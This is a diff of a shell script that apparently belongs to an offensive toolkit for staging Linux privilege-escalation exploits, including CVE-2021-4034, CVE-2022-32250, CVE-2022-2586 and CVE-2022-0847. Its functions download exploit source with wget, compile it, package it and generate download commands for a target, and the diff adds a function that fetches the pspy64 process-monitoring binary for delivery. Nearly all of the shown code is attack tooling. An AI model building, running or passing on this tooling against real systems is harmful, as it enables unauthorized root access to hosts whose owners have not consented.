@@ -240,7 +240,10 @@ perform_cve_2021_4034() {
         fi
     fi
     popd || exit 1
-    rm $cve_filename
+    if [[ -f "$cve_filename" ]]; then
+        echo "Removing existing $cve_filename"
+        rm $cve_filename
+    fi
     compress_file "$cve_filename" "$cve_dir"
     generate_download_linux $cve_filename
     get_uncompress_command "$cve_filename"
@@ -339,19 +342,23 @@ perform_cve_2022_32250() {
     if [[ ! -f "exp.c" ]]; then
         wget "$download_url" -O "exp.c"
     fi
-    if [[ ! -z "$compile_exploit" ]]; then
+    if [[ ! -z "$compile_exploit" ]] && [[ "$compile_exploit" == "true" ]]; then
         if [ ! -f exp ]; then
             echo "Compiling exploit..."
             echo "all:" > Makefile
             echo -e "\tgcc -o exp exp.c -lmnl -lnftnl -w -Wno-error=implicit-function-declaration" >> Makefile
             extra_packages="libmnl-dev libnftnl-dev"
+            target_os="ubuntu:22.04"
             compile_cpp
         else
             echo "Exploit already compiled, skipping compilation."
         fi
     fi
     popd || exit 1
-    rm $cve_filename
+    if [[ -f "$cve_filename" ]]; then
+        echo "Removing existing $cve_filename"
+        rm $cve_filename
+    fi
     compress_file "$cve_filename" "$cve_dir"
     generate_linux_download "$cve_filename"
     get_uncompress_command "$cve_filename"
@@ -386,13 +393,17 @@ perform_cve_2022_2586() {
             echo "all:" > Makefile
             echo -e "\tgcc exploit.c -lmnl -lnftnl -no-pie -lpthread -w -o exploit" >> Makefile
             extra_packages="libmnl-dev libnftnl-dev"
+            target_os="ubuntu:22.04"
             compile_cpp
         else
             echo "Exploit already compiled, skipping compilation."
         fi
     fi
     popd || exit 1
-    rm $cve_filename
+    if [[ -f "$cve_filename" ]]; then
+        echo "Removing existing $cve_filename"
+        rm "$cve_filename"
+    fi
     compress_file "$cve_filename" "$cve_dir"
     generate_linux_download "$cve_filename"
     get_uncompress_command "$cve_filename"
@@ -435,4 +446,15 @@ perform_cve_2022_0847() {
     echo "./compile.sh"
     echo "./exploit-1"
     echo "./exploit-2"  
+}
+
+
+get_pspy() {
+    local url='https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64'
+    if [[ -f "pspy64" ]]; then
+        echo "pspy64 already exists, skipping download."
+    else
+        wget "$url" -O pspy64
+    fi
+    generate_linux_download "pspy64"
 }
